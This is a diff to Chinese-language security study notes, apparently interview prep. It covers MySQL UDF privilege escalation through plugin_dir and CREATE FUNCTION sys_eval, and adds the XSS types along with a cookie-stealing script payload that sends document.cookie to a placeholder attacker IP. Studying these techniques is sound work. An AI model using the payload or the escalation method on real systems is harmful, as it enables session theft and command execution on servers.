@@ -13,4 +13,5 @@
 ## 原理:利用MySQL的`plugin_dir`目录,将恶意的动态链接库(Windows下是DLL,Linux下是SO)写入该目录.然后通过SQL语句`CREATE FUNCTION`创建自定义函数(如`sys_eval`),调用该函数即可执行系统命令,实现提权
 
 # 8、XSS的类型及窃取Cookie的执行方式
-## 类型:反射型(非持久)、存储型(持久)
+## 类型:反射型(非持久)、存储型(持久)、DOM型
+## 窃取方式:构造Payload ` <script>new Image().src="http://攻击者IP/?c="+document.cookie</script> ` 诱导用户访问.用户浏览器会带着自己的Cookie请求攻击者的服务器 ,攻击者通过查看服务器日志即可获取Cookie
